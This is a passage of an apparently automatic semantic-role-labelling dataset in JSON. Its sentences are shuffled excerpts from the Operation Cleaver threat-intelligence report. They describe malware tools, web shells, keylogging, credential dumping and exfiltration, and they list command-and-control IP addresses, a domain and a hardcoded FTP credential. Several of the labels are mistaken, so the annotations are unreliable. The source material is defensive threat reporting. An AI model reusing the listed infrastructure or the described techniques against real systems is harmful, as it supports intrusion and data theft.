infiltration campaign": {"has": {"V": {"text": "has", "index": 2}}, "conducted": {"ARG0": {"text": "Operation Cleaver"}, "ARGM-TMP": {"text": ",/ over the past several years"}, "V": {"text": "conducted", "index": 10}, "ARG1": {"text": "a significant global surveillance and infiltration campaign"}}}, "\n</section>\n\n<section>\n  <heading>PVZ-In</heading>      \n  The purpose of PVZ-In is to communicate with a command and control server": {"is": {"ARG1": {"text": "The purpose of PVZ - In"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "to communicate with a command and control server"}}, "communicate": {"V": {"text": "communicate", "index": 8}, "ARG2": {"text": "with a command and control server"}}}, "\n</section>\n\n\n\n<footer>54</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>Command and Control Servers</heading>\n<list>\n        \u2022   88.150.214.168, United Kingdom, microsoftactiveservices(dot)com\n        \u2022   95.211.241.249, Amsterdam, Noord-Holland, Netherlands\n        \u2022   88.150.214.166, United Kingdom\n        \u2022   173.192.144.68, Seattle, Washington, USA\n        \u2022   188.227.180.213, United Kingdom\n        \u2022   192.111.145.197, Rochester, New York, USA\n</list>\n</section>\n\n<section>\n  <heading>Backdoors</heading>\n\n  Multiple backdoors were used by this organization": {"were": {"V": {"text": "were", "index": 2}}, "used": {"ARG1": {"text": "Multiple backdoors"}, "V": {"text": "used", "index": 3}, "ARG0": {"text": "by this organization"}}}, " The known command and control server is located at http://kundenpflege": {"known": {"V": {"text": "known", "index": 1}, "ARG1": {"text": "command"}}, "is": {"V": {"text": "is", "index": 6}}, "located": {"ARG1": {"text": "The known command and control server"}, "V": {"text": "located", "index": 7}, "ARGM-LOC": {"text": "at http://kundenpflege"}}}, " There are limitless\n  methods of persistence; the following are techniques and tools for persistence used by Cleaver": {"are": {"V": {"text": "are", "index": 1}, "ARG1": {"text": "limitless methods of persistence"}}, "following": {"V": {"text": "following", "index": 8}}, "are_2": {"ARG1": {"text": "the following"}, "V": {"text": "are", "index": 9}, "ARG2": {"text": "techniques and tools for persistence used by Cleaver"}}, "used": {"ARG1": {"text": "techniques"}, "V": {"text": "used", "index": 15}, "ARG0": {"text": "by Cleaver"}}}, " The creator generates\nan ASPX web shell using user input as well as a collection of templates": {"generates": {"ARG0": {"text": "The creator"}, "V": {"text": "generates", "index": 2}, "ARG1": {"text": "an ASPX web shell using user input as well as a collection of templates"}}, "using": {"V": {"text": "using", "index": 7}, "ARG1": {"text": "user input"}}}, "\n   \n  An ASPX backdoor named Zh0uSh311 was located on live servers as well as recovered fro\n  a staging server": {"named": {"ARG1": {"text": "An ASPX"}, "V": {"text": "named", "index": 3}, "ARG2": {"text": "Zh0uSh311"}}, "was": {"V": {"text": "was", "index": 5}}, "located": {"ARG1": {"text": "An ASPX backdoor named Zh0uSh311"}, "V": {"text": "located", "index": 6}, "ARGM-LOC": {"text": "on live servers"}}, "recovered": {"ARG0": {"text": "An ASPX backdoor named Zh0uSh311"}, "V": {"text": "recovered", "index": 13}, "ARG1": {"text": "fro/ a staging server"}}}, "\n</section>\n\n<section>\n<heading>Logger Module</heading>\nLogger Module observes the user\u2019s actions and records them to a file": {"observes": {"ARG0": {"text": "Logger Module"}, "V": {"text": "observes", "index": 2}, "ARG1": {"text": "the user \u2019s actions"}}, "records": {"V": {"text": "records", "index": 8}, "ARG1": {"text": "them"}, "ARGM-PRD": {"text": "to a file"}}}, " The recorded actions include\nmouse clicks, active windows, keypresses, as well as clipboard data": {"recorded": {"V": {"text": "recorded", "index": 1}, "ARG1": {"text": "actions"}}, "include": {"ARG2": {"text": "The recorded actions"}, "V": {"text": "include", "index": 3}, "ARG1": {"text": "mouse clicks , active windows , keypresses , as well as clipboard data"}}, "keypresses": {"ARG1": {"text": "mouse clicks"}, "V": {"text": "keypresses", "index": 10}}}, " This email functionality is used to exfiltrate\n  the results of commands from the command file which can also include requests like gathering\n  user information": {"is": {"V": {"text": "is", "index": 3}}, "used": {"ARG1": {"text": "This email functionality"}, "V": {"text": "used", "index": 4}, "ARG2": {"text": "to exfiltrate the results of commands from the command file which can also include requests like gathering user information"}}, "exfiltrate": {"ARG0": {"text": "This email functionality"}, "V": {"text": "exfiltrate", "index": 6}, "ARG1": {"text": "the results of commands from the command file which can also include requests like gathering user information"}}, "can": {"V": {"text": "can", "index": 16}}, "include": {"ARG2": {"text": "the command file"}, "R-ARG2": {"text": "which"}, "ARGM-MOD": {"text": "can"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "include", "index": 18}, "ARG1": {"text": "requests like gathering user information"}}, "gathering": {"V": {"text": "gathering", "index": 21}, "ARG1": {"text": "user information"}}}, " The\n  operators of the blog IranRedLine.org, which comments on Iran\u2019s nuclear weapons efforts, has\n  mentioned in multiple posts having been the target of debilitating brute-force authentication attacks\n  from IP addresses registered to the same Tarh Andishan team found in Cleaver": {"comments": {"ARG0": {"text": "the blog IranRedLine.org"}, "R-ARG0": {"text": "which"}, "V": {"text": "comments", "index": 8}, "ARG1": {"text": "on Iran \u2019s nuclear weapons efforts"}}, "has": {"V": {"text": "has", "index": 16}}, "mentioned": {"ARG0": {"text": "The operators of the blog IranRedLine.org , which comments on Iran \u2019s nuclear weapons efforts"}, "V": {"text": "mentioned", "index": 17}, "ARGM-LOC": {"text": "in multiple posts"}, "ARG1": {"text": "having been the target of debilitating brute - force authentication attacks from IP addresses registered to the same Tarh Andishan team found in Cleaver"}}, "having": {"V": {"text": "having", "index": 21}}, "been": {"ARG1": {"text": "multiple posts"}, "V": {"text": "been", "index": 22}, "ARG2": {"text": "the target of debilitating brute - force authentication attacks from IP addresses registered to the same Tarh Andishan team found"}}, "debilitating": {"V": {"text": "debilitating", "index": 26}, "ARG1": {"text": "brute - force authentication attacks"}, "ARG2": {"text": "from IP addresses registered to the same"}}, "registered": {"ARG1": {"text": "IP addresses"}, "V": {"text": "registered", "index": 35}, "ARG2": {"text": "to the same Tarh"}}, "found": {"V": {"text": "found", "index": 42}, "ARGM-LOC": {"text": "in Cleaver"}}}, "\n\n On the server side, we can see our message has been received:\n\n<figure></figure>\n\n\n If stricter egress filtering is enabled, the attackers can use zhCat to also XOR encrypt the traffic\n with a shared key": {"can": {"V": {"text": "can", "index": 6}}, "see": {"ARGM-LOC": {"text": "On the server side"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "see", "index": 7}, "ARG1": {"text": "our message has been received"}}, "has": {"V": {"text": "has", "index": 10}}, "been": {"V": {"text": "been", "index": 11}}, "received": {"ARG1": {"text": "our message"}, "V": {"text": "received", "index": 12}}, "is": {"V": {"text": "is", "index": 18}}, "enabled": {"ARG1": {"text": "stricter egress filtering"}, "V": {"text": "enabled", "index": 19}}, "can_2": {"V": {"text": "can", "index": 23}}, "use": {"ARGM-ADV": {"text": "If stricter egress filtering is enabled"}, "ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "use", "index": 24}, "ARG1": {"text": "zhCat"}, "ARG2": {"text": "to also XOR encrypt the traffic with a shared key"}}, "encrypt": {"ARG0": {"text": "zhCat"}, "V": {"text": "encrypt", "index": 29}, "ARG1": {"text": "the traffic"}, "ARGM-MNR": {"text": "with a shared key"}}, "shared": {"V": {"text": "shared", "index": 34}, "ARG1": {"text": "key"}}}, " The TinyZBot queries the server in\n  order to enumerate all files currently available to it": {"queries": {"ARG0": {"text": "The TinyZBot"}, "V": {"text": "queries", "index": 2}, "ARG1": {"text": "the server"}, "ARGM-PRP": {"text": "in order to enumerate all files currently available to it"}}, "enumerate": {"V": {"text": "enumerate", "index": 8}, "ARG1": {"text": "all files currently available"}, "ARG2": {"text": "to it"}}}, " SmartAssembly was reused again": {"was": {"ARG1": {"text": "SmartAssembly"}, "V": {"text": "was", "index": 1}, "ARG2": {"text": "reused"}, "ARGM-TMP": {"text": "again"}}, "reused": {"ARG1": {"text": "SmartAssembly"}, "V": {"text": "reused", "index": 2}, "ARGM-TMP": {"text": "again"}}}, " The purpose is deception, to make\n  the binder indistinguishable from the desired application": {"is": {"ARG1": {"text": "The purpose"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "deception"}, "C-ARG1": {"text": "to make the binder indistinguishable from the desired application"}}, "make": {"V": {"text": "make", "index": 6}, "ARG1": {"text": "the binder indistinguishable"}, "ARG2": {"text": "from the desired application"}}, "desired": {"V": {"text": "desired", "index": 12}, "ARG0": {"text": "application"}}}, "\n\n</section>\n<section>\n <heading>Iran\u2019s Cyber Hacking Skills Have Evolved</heading>\n \u2022\t Initial compromise techniques include SQL injection, web attacks, and creative deception-\n    based attacks \u2013 all of which have been implemented in the past by Chinese and Russian\n    hacking teams": {"include": {"ARG2": {"text": "\u2022 Initial compromise techniques"}, "V": {"text": "include", "index": 4}, "ARG1": {"text": "SQL injection , web attacks , and creative deception- based attacks \u2013 all of which have been implemented in the past by Chinese and Russian hacking teams"}}, "based": {"ARG2": {"text": "creative deception-"}, "V": {"text": "based", "index": 14}, "ARG1": {"text": "attacks"}}, "have": {"V": {"text": "have", "index": 20}}, "been": {"V": {"text": "been", "index": 21}}, "implemented": {"ARG1": {"text": "creative deception- based attacks \u2013"}, "R-ARG1": {"text": "all of which"}, "V": {"text": "implemented", "index": 22}, "ARGM-TMP": {"text": "in the past"}, "ARG0": {"text": "by Chinese and Russian hacking teams"}}}, " Stuxnet was an\neye-opening event for Iranian authorities, exposing them to the\nworld of physical destruction via electronic means": {"was": {"ARG1": {"text": "Stuxnet"}, "V": {"text": "was", "index": 1}, "ARG2": {"text": "an eye - opening event"}, "ARGM-GOL": {"text": "for Iranian authorities"}, "ARGM-ADV": {"text": "exposing them to the world of physical destruction via electronic means"}}, "opening": {"ARGM-MNR": {"text": "eye"}, "V": {"text": "opening", "index": 5}, "ARG1": {"text": "event"}}, "exposing": {"ARG0": {"text": "Stuxnet"}, "V": {"text": "exposing", "index": 11}, "ARG1": {"text": "them"}, "ARG2": {"text": "to the world of physical destruction"}, "ARGM-MNR": {"text": "via electronic means"}}}, "\n\n<figure></figure>\n\n                          \n On the server side, we can see this information being received:\n      \n<figure></figure>\n\n zhCat has a variety of other features such as port mirroring as well as traffic redirecting": {"has": {"ARG0": {"text": "zhCat"}, "V": {"text": "has", "index": 1}, "ARG1": {"text": "a variety of other features such as port mirroring as well as traffic redirecting"}}}, " In May 2014, evidence emerged of a highly targeted waterhole attack that leveraged social\nmedia, dubbed Operation Newscaster, which was uncovered by iSight Partners": {"emerged": {"ARGM-TMP": {"text": "In May 2014"}, "ARG0": {"text": "evidence"}, "V": {"text": "emerged", "index": 5}, "ARG1": {"text": "of a highly targeted waterhole attack that leveraged social media , dubbed Operation Newscaster , which was uncovered by iSight Partners"}}, "targeted": {"ARGM-EXT": {"text": "highly"}, "V": {"text": "targeted", "index": 9}, "ARG1": {"text": "waterhole attack"}}, "leveraged": {"ARG0": {"text": "a highly targeted waterhole attack"}, "R-ARG0": {"text": "that"}, "V": {"text": "leveraged", "index": 13}, "ARG1": {"text": "social media ,"}}, "dubbed": {"ARG1": {"text": "leveraged social media"}, "V": {"text": "dubbed", "index": 17}, "ARG2": {"text": "Operation Newscaster"}}, "was": {"V": {"text": "was", "index": 22}}, "uncovered": {"ARG1": {"text": "leveraged social media , dubbed Operation Newscaster"}, "R-ARG1": {"text": "which"}, "V": {"text": "uncovered", "index": 23}, "ARG0": {"text": "by"}}}, "\n\n  Commands, updates and files to drop and execute are stored as files on the SOAP server, and\n  access is restricted by the AppUsageID as well as the bot GUID": {"drop": {"ARG1": {"text": "Commands"}, "V": {"text": "drop", "index": 6}}, "execute": {"V": {"text": "execute", "index": 8}}, "are": {"V": {"text": "are", "index": 9}}, "stored": {"ARG1": {"text": "Commands , updates and files to drop and execute"}, "V": {"text": "stored", "index": 10}, "ARGM-PRD": {"text": "as files"}, "ARGM-LOC": {"text": "on the SOAP server"}}, "is": {"V": {"text": "is", "index": 20}}, "restricted": {"ARG1": {"text": "access"}, "V": {"text": "restricted", "index": 21}, "ARG0": {"text": "by the AppUsageID as well as the bot GUID"}}}, "\n \u2022\t Confidential critical infrastructure documents were harvested from major educational\n    institutions around the world": {"were": {"V": {"text": "were", "index": 5}}, "harvested": {"ARG1": {"text": "\u2022 Confidential critical infrastructure documents"}, "V": {"text": "harvested", "index": 6}, "ARG3": {"text": "from major educational institutions around the world"}}}, " This also allowed for separate commands to be supplied to different targets\n without the need for per-bot commands": {"allowed": {"ARG0": {"text": "This"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "allowed", "index": 2}, "ARG1": {"text": "for separate commands to be supplied to different targets without the need for per - bot commands"}}, "be": {"V": {"text": "be", "index": 7}}, "supplied": {"ARG1": {"text": "separate commands"}, "V": {"text": "supplied", "index": 8}, "ARGM-PRP": {"text": "to different targets"}, "ARGM-MNR": {"text": "without the need for per - bot commands"}}}, " These\n versions began to include a new method of installing as a service": {"began": {"V": {"text": "began", "index": 2}, "C-ARG1": {"text": "to include a new method of installing as a service"}}, "include": {"ARG2": {"text": "These versions"}, "V": {"text": "include", "index": 4}, "ARG1": {"text": "a new method of installing as a service"}}, "installing": {"V": {"text": "installing", "index": 9}, "ARG2": {"text": "as a service"}}}, "\n\nPivoting is the process of leveraging access from one compromised computer in order to gain\naccess to additional systems on the target network": {"Pivoting": {"V": {"text": "Pivoting", "index": 0}}, "is": {"ARG1": {"text": "Pivoting"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "the process of leveraging access from one compromised computer in order to gain access to additional systems on the target network"}}, "leveraging": {"V": {"text": "leveraging", "index": 5}, "ARG1": {"text": "access"}, "ARG2": {"text": "from one compromised computer"}, "ARGM-PRP": {"text": "in order to gain access to additional systems on the target network"}}, "compromised": {"V": {"text": "compromised", "index": 9}, "ARG1": {"text": "computer"}}, "gain": {"V": {"text": "gain", "index": 14}, "ARG1": {"text": "access to additional systems on the target network"}}}, " When executed, and before\nany connection to an instance of the web shell is initiated, the shell client communicates with\nfreegeoip.net in order to get the external IP address of the current user": {"executed": {"ARGM-TMP": {"text": "When"}, "V": {"text": "executed", "index": 1}}, "is": {"V": {"text": "is", "index": 14}}, "initiated": {"ARGM-TMP": {"text": "When/ before any connection to an instance of"}, "ARG1": {"text": "the web shell"}, "V": {"text": "initiated", "index": 15}}, "get": {"V": {"text": "get", "index": 26}, "ARG1": {"text": "the external IP address of the current user"}}}, " Avira antivirus was specifically targeted and disabled, due to its detection of\n  the new keystroke logger module added in this version": {"was": {"ARG1": {"text": "Avira antivirus"}, "V": {"text": "was", "index": 2}, "ARG2": {"text": "specifically targeted and disabled"}, "ARGM-CAU": {"text": "due to its detection of the new keystroke logger module added in this version"}}, "targeted": {"ARG2": {"text": "Avira antivirus"}, "ARGM-ADV": {"text": "specifically"}, "V": {"text": "targeted", "index": 4}, "ARGM-CAU": {"text": "due to its detection of the new keystroke logger module added in this version"}}, "added": {"ARG1": {"text": "the new keystroke logger module"}, "V": {"text": "added", "index": 18}, "ARGM-LOC": {"text": "in this version"}}}, " This log was generated during the usage of the nbrute utility, which brute-forces network\n credentials and relies on NMAP to do so": {"was": {"V": {"text": "was", "index": 2}}, "generated": {"ARG1": {"text": "This log"}, "V": {"text": "generated", "index": 3}, "ARGM-TMP": {"text": "during the usage of the nbrute utility , which brute - forces network credentials and relies on NMAP to do so"}}, "relies": {"ARG0": {"text": "the nbrute utility"}, "R-ARG0": {"text": "which"}, "V": {"text": "relies", "index": 19}, "ARG1": {"text": "on NMAP"}, "ARG2": {"text": "to do so"}}, "do": {"ARG0": {"text": "which/ brute - forces network credentials and relies on NMAP"}, "V": {"text": "do", "index": 23}, "ARG1": {"text": "so"}}}, "\n\n Compromised systems include Microsoft Windows web servers running IIS and ColdFusion,\n Apache with PHP, many variants of Microsoft Windows desktops and servers, and Linux servers": {"include": {"ARG2": {"text": "Compromised systems"}, "V": {"text": "include", "index": 2}, "ARG1": {"text": "Microsoft Windows web servers running IIS and ColdFusion , Apache with PHP , many variants of Microsoft Windows desktops and servers , and Linux servers"}}, "running": {"ARG0": {"text": "Microsoft Windows web servers"}, "V": {"text": "running", "index": 7}, "ARG1": {"text": "IIS and ColdFusion"}}, "desktops": {"ARG1": {"text": "Microsoft Windows"}, "V": {"text": "desktops", "index": 21}}}, "\n<list>                                                                                          \n        \u2022 Teledyne-Jobs.com\n        \u2022 Doosan-Job.com\n        \u2022 NorthropGrumman.net\n</list>\n<figure></figure>\n<caption>Figure 16: When the r\u00e9sum\u00e9 submitting\napplication is executed, a splash screen is\ndisplayed.</caption>  \n\n At this point, the r\u00e9sum\u00e9 submission application checks the\n Internet connection": {"checks": {"ARGM-DIS": {"text": "At this point"}, "ARG0": {"text": "the r\u00e9sum\u00e9 submission application"}, "V": {"text": "checks", "index": 8}, "ARG1": {"text": "the Internet connection"}}}, "\n\n\n\n<footer>57</footer>\n\f\n<header> \nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\nData uploaded is often compressed, which can make it more difficult to detect the exfiltration of\nsensitive information": {"uploaded": {"ARG1": {"text": "Data"}, "V": {"text": "uploaded", "index": 1}}, "is": {"ARG1": {"text": "Data uploaded"}, "V": {"text": "is", "index": 2}, "ARGM-TMP": {"text": "often"}, "ARG2": {"text": "compressed"}, "ARGM-ADV": {"text": "which can make it more difficult to detect the exfiltration of sensitive information"}}, "compressed": {"ARG1": {"text": "Data uploaded"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "compressed", "index": 4}, "ARGM-ADV": {"text": "which can make it more difficult to detect the exfiltration of sensitive information"}}, "can": {"V": {"text": "can", "index": 7}}, "make": {"ARG0": {"text": "which"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "make", "index": 8}, "ARG1": {"text": "it more difficult to detect the exfiltration of sensitive information"}}, "detect": {"V": {"text": "detect", "index": 13}, "ARG1": {"text": "the exfiltration of sensitive information"}}}, "\n</section>\n<section>\n<heading>SQL Injection</heading>\nSQL injection is a very common and simple attack method": {"is": {"ARG1": {"text": "SQL injection"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a very common and simple attack method"}}}, "\n\n<figure></figure>\n</section>\n\n<footer>43</footer>\n\f\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n<section>\n <heading>zhCat (cont.)</heading>\n If we observe the network communications during this transfer, we can see the following HTTP\n POST request": {"observe": {"ARG0": {"text": "we"}, "V": {"text": "observe", "index": 2}, "ARG1": {"text": "the network communications"}, "ARGM-TMP": {"text": "during this transfer"}}, "can": {"V": {"text": "can", "index": 11}}, "see": {"ARGM-ADV": {"text": "If we observe the network communications during this transfer"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "see", "index": 12}, "ARG1": {"text": "the following HTTP POST request"}}}, "\n</section>\n\n<section>\n<heading>SOAP</heading>\nSOAP is a sub-protocol communicated via HTTP": {"is": {"ARG1": {"text": "SOAP"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a sub - protocol communicated via HTTP"}}, "communicated": {"ARG1": {"text": "sub - protocol"}, "V": {"text": "communicated", "index": 6}, "ARGM-MNR": {"text": "via HTTP"}}}, " Famous\nexamples of these efforts include industrial sabotage via\nStuxnet (2009 - 2010), and espionage with Duqu (2009 - 2011)\nas well as Flame (2012)": {"include": {"ARG2": {"text": "Famous examples of these efforts"}, "V": {"text": "include", "index": 5}, "ARG1": {"text": "industrial sabotage via Stuxnet ( 2009 - 2010 ) , and espionage with Duqu ( 2009 - 2011 ) as well as Flame ( 2012 )"}}}, " It is likely that SOAP was used because it is simple to\nimplement in C#, and has the added benefit of blending in with other benign HTTP traffic": {"is": {"ARG1": {"text": "It"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "likely that SOAP was used because it is simple to implement in C # , and has the added benefit of blending in with other benign HTTP traffic"}}, "was": {"V": {"text": "was", "index": 5}}, "used": {"ARG1": {"text": "SOAP"}, "V": {"text": "used", "index": 6}}, "is_2": {"V": {"text": "is", "index": 9}, "ARG2": {"text": "simple"}, "ARG1": {"text": "to implement in C #"}}, "implement": {"ARG1": {"text": "it"}, "V": {"text": "implement", "index": 12}, "ARGM-MNR": {"text": "in C #"}}, "has": {"ARG0": {"text": "it"}, "V": {"text": "has", "index": 18}, "ARG1": {"text": "the added benefit of blending in with other benign HTTP traffic"}}, "added": {"V": {"text": "added", "index": 20}, "ARG1": {"text": "benefit"}}, "blending": {"V": {"text": "blending", "index": 23}, "ARG2": {"text": "with other benign HTTP traffic"}}}, "\n</section>\n\n\n\n<footer>45</footer>\n\f\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n<section>\n<heading>SMTP</heading>\nEarly Cleaver operations abused SMTP in order to exfiltrate information": {"abused": {"ARG0": {"text": "Early Cleaver operations"}, "V": {"text": "abused", "index": 3}, "ARG1": {"text": "SMTP"}, "ARGM-PRP": {"text": "in order to exfiltrate information"}}, "exfiltrate": {"V": {"text": "exfiltrate", "index": 8}, "ARG1": {"text": "information"}}}, " This clever scheme makes sure the\n malware can connect to the command and control server,\n and increases the chances that domain credentials are\n cached on the now infected machine": {"makes": {"ARG0": {"text": "This clever scheme"}, "V": {"text": "makes", "index": 3}, "ARG1": {"text": "sure the malware can connect to the command and control server , and increases the chances that domain credentials are cached on the now infected machine"}}, "can": {"V": {"text": "can", "index": 7}}, "connect": {"ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "connect", "index": 8}, "ARG1": {"text": "to the command and control server"}}, "increases": {"ARG0": {"text": "This clever scheme"}, "V": {"text": "increases", "index": 17}, "ARG1": {"text": "the chances that domain credentials are cached on the now infected machine"}}, "are": {"ARG1": {"text": "domain credentials"}, "V": {"text": "are", "index": 23}, "ARG2": {"text": "cached on the now infected machine"}}, "cached": {"ARG1": {"text": "the chances"}, "R-ARG1": {"text": "that"}, "ARG2": {"text": "domain credentials"}, "V": {"text": "cached", "index": 24}, "ARGM-LOC": {"text": "on the now"}}, "infected": {"ARGM-TMP": {"text": "now"}, "V": {"text": "infected", "index": 28}, "ARG1": {"text": "machine"}}}, " NetCat has an option when being\ncompiled to enable or disable the ability for NetCat to execute a command after the connection\nis established": {"has": {"ARG0": {"text": "NetCat"}, "V": {"text": "has", "index": 1}, "ARG1": {"text": "an option"}, "ARGM-TMP": {"text": "when being compiled to enable or disable the ability for NetCat to execute a command after the connection is established"}}, "being": {"V": {"text": "being", "index": 5}}, "compiled": {"ARGM-TMP": {"text": "when"}, "V": {"text": "compiled", "index": 6}, "ARGM-PRP": {"text": "to enable"}}, "enable": {"V": {"text": "enable", "index": 8}, "ARG1": {"text": "the ability for NetCat to execute a command after the connection is established"}}, "disable": {"V": {"text": "disable", "index": 10}, "ARG1": {"text": "the ability for NetCat to execute a command after the connection is established"}}, "execute": {"ARG0": {"text": "NetCat"}, "V": {"text": "execute", "index": 16}, "ARG1": {"text": "a command"}, "ARGM-TMP": {"text": "after the connection is established"}}, "is": {"V": {"text": "is", "index": 22}}, "established": {"ARG1": {"text": "the connection"}, "V": {"text": "established", "index": 23}}}, " While the user\n enters this information, their machine is infected with TinyZBot": {"enters": {"ARG0": {"text": "the user"}, "V": {"text": "enters", "index": 3}, "ARG1": {"text": "this information"}}, "is": {"V": {"text": "is", "index": 9}}, "infected": {"ARGM-TMP": {"text": "While the user enters this information"}, "ARG1": {"text": "their machine"}, "V": {"text": "infected", "index": 10}, "ARG2": {"text": "with TinyZBot"}}}, " FTP upload\n support was added, with hardcoded credentials of ano:1": {"was": {"V": {"text": "was", "index": 3}}, "added": {"ARG1": {"text": "FTP upload support"}, "V": {"text": "added", "index": 4}, "ARGM-ADV": {"text": "with hardcoded credentials of ano:1"}}}, " The following is the key used for XOR\n encryption:\n<list>\n     Sorry! The handle to file %s is not a valid handle any more.\\nSorry!\n             The handle to file %s is not a valid handle any more": {"is": {"ARG1": {"text": "The following"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "the key used for XOR encryption"}}, "used": {"V": {"text": "used", "index": 5}, "ARG2": {"text": "for XOR encryption"}}, "file": {"V": {"text": "file", "index": 15}, "ARG1": {"text": "% s"}}, "is_2": {"ARG1": {"text": "The handle to file % s"}, "V": {"text": "is", "index": 18}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "a valid handle any more.\\nSorry"}}, "handle": {"ARG0": {"text": "a valid"}, "V": {"text": "handle", "index": 22}, "ARG1": {"text": "any more.\\nSorry"}}, "file_2": {"V": {"text": "file", "index": 29}, "ARG1": {"text": "% s"}}, "is_3": {"ARG1": {"text": "The handle to file % s"}, "V": {"text": "is", "index": 32}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "a valid handle"}, "ARGM-TMP": {"text": "any more"}}, "handle_2": {"ARG0": {"text": "a valid"}, "V": {"text": "handle", "index": 36}, "ARG1": {"text": "any more"}}}, "\n\n  The resulting executable masquerades as the desired software": {"resulting": {"V": {"text": "resulting", "index": 1}}, "desired": {"V": {"text": "desired", "index": 6}, "ARG1": {"text": "software"}}}, " These versions have the capability to install as a service": {"have": {"ARG0": {"text": "These versions"}, "V": {"text": "have", "index": 2}, "ARG1": {"text": "the capability to install as a service"}}, "install": {"V": {"text": "install", "index": 6}, "ARGM-PRD": {"text": "as a service"}}}, " This was likely to avoid detonation-based detection engines": {"was": {"ARG1": {"text": "This"}, "V": {"text": "was", "index": 1}, "ARG2": {"text": "likely to avoid detonation - based detection engines"}}, "avoid": {"ARG0": {"text": "This"}, "V": {"text": "avoid", "index": 4}, "ARG1": {"text": "detonation - based detection engines"}}, "based": {"ARG2": {"text": "detonation"}, "V": {"text": "based", "index": 7}, "ARG1": {"text": "detection engines"}}}, " Nesha was seen in breaches involving\n  SQL injection as well as other techniques": {"was": {"V": {"text": "was", "index": 1}}, "seen": {"ARG1": {"text": "Nesha"}, "V": {"text": "seen", "index": 2}, "ARGM-LOC": {"text": "in breaches involving SQL injection as well as other techniques"}}, "involving": {"ARG2": {"text": "breaches"}, "V": {"text": "involving", "index": 5}, "ARG1": {"text": "SQL injection as well as other techniques"}}}, " In this context, it is the process\n  of stealing information without being detected": {"is": {"ARGM-ADV": {"text": "In this context"}, "ARG1": {"text": "it"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "the process of stealing information without being detected"}}, "stealing": {"V": {"text": "stealing", "index": 9}, "ARG1": {"text": "information"}, "ARGM-MNR": {"text": "without being detected"}}, "being": {"V": {"text": "being", "index": 12}}, "detected": {"V": {"text": "detected", "index": 13}}}, "                                                                                              \n\n                                                   \n                                                   \n                                                   \n<figure></figure>                                  \n                                                   \n<caption>Figure 17: Unable to connect to the Internet, the                                  \ntool prompts the user for proxy configuration\ninformation.</caption>                                       \n                                                   \n\n<figure></figure>\n\n\n<caption>Figure 18: Final r\u00e9sum\u00e9 submission form\ndisplays to the user while the malware runs\nfreely in the background.</caption>\n\n</section>\n\n\n<footer>34</footer>\n\f\n<header>#OPCLEAVER</header>\n<section>\n\n  <heading>Teledyne R\u00e9sum\u00e9 Submitter (cont.)</heading>\n\n  The first r\u00e9sum\u00e9 submission form requests contact information": {}, " This dropper impersonated a tool to submit a r\u00e9sum\u00e9 to Teledyne": {"impersonated": {"ARG0": {"text": "This dropper"}, "V": {"text": "impersonated", "index": 2}, "ARG1": {"text": "a tool to submit a r\u00e9sum\u00e9 to Teledyne"}}, "submit": {"V": {"text": "submit", "index": 6}, "ARG1": {"text": "a r\u00e9sum\u00e9 to Teledyne"}}}, " This makes it more difficult to detect that privileged information is being exfiltrated": {"makes": {"ARG0": {"text": "This"}, "V": {"text": "makes", "index": 1}, "ARG1": {"text": "it more difficult to detect that privileged information is being exfiltrated"}}, "detect": {"V": {"text": "detect", "index": 6}, "ARG1": {"text": "that privileged information is being exfiltrated"}}, "is": {"V": {"text": "is", "index": 10}}, "being": {"ARG1": {"text": "privileged information"}, "V": {"text": "being", "index": 11}, "ARG2": {"text": "exfiltrated"}}, "exfiltrated": {"ARG1": {"text": "privileged information"}, "V": {"text": "exfiltrated", "index": 12}}}, "\n</section>\n<section>\n<heading>Cached Credential Dumping</heading>\nA very common method of pivoting on a predominantly Windows operating system based\nnetwork is to extract domain credentials which have been used on the compromised computer\nfrom a credential cache": {"pivoting": {"V": {"text": "pivoting", "index": 5}, "ARG1": {"text": "on a predominantly Windows operating system based network"}}, "based": {"V": {"text": "based", "index": 12}, "ARG1": {"text": "network"}}, "is": {"ARG1": {"text": "A very common method of pivoting on a predominantly Windows operating system based network"}, "V": {"text": "is", "index": 14}, "ARG2": {"text": "to extract domain credentials which have been used on the compromised computer from a credential cache"}}, "extract": {"V": {"text": "extract", "index": 16}, "ARG1": {"text": "domain credentials which have been used on the compromised computer from a credential cache"}}, "have": {"V": {"text": "have", "index": 20}}, "been": {"V": {"text": "been", "index": 21}}, "used": {"ARG1": {"text": "domain credentials"}, "R-ARG1": {"text": "which"}, "V": {"text": "used", "index": 22}, "ARGM-LOC": {"text": "on the compromised computer"}, "ARG0": {"text": "from a credential cache"}}, "compromised": {"V": {"text": "compromised", "index": 25}, "ARG1": {"text": "computer"}}}, " An update mechanism was added, and could be regularly scheduled,\n so unassisted periodic update checks were automatically performed": {"was": {"V": {"text": "was", "index": 3}}, "added": {"ARG1": {"text": "An update mechanism"}, "V": {"text": "added", "index": 4}}, "could": {"V": {"text": "could", "index": 7}}, "be": {"V": {"text": "be", "index": 8}}, "scheduled": {"ARG1": {"text": "An update mechanism"}, "ARGM-MOD": {"text": "could"}, "ARGM-MNR": {"text": "regularly"}, "V": {"text": "scheduled", "index": 10}}, "were": {"V": {"text": "were", "index": 17}}, "performed": {"ARG1": {"text": "unassisted 